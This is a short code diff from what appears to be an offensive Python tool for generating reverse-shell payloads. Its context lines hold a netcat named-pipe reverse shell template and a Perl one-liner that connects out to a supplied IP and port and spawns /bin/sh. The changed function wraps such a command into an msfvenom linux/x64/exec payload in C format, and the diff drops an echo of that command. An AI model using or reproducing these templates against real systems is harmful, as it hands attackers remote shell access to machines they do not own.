@@ -23,7 +23,7 @@ rm -f /tmp/p; mknod /tmp/p p && nc {} {} 0/tmp/p""".split('\n')
 rev_shell_port_ip = """perl -e 'use Socket;$p={};$i="{}";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' """.split('\n')
 
 def msfvenom_command_gen(cmd):
-    return  'rev_sh=\'{}\'; echo "$rev_sh"; '.format(cmd.replace('\'', '\'\\\'\'')) +\
+    return  'rev_sh=\'{}\'; '.format(cmd.replace('\'', '\'\\\'\'')) +\
         'msfvenom -p linux/x64/exec CMD="$rev_sh" -f c {}'.format('')
 
 # type1
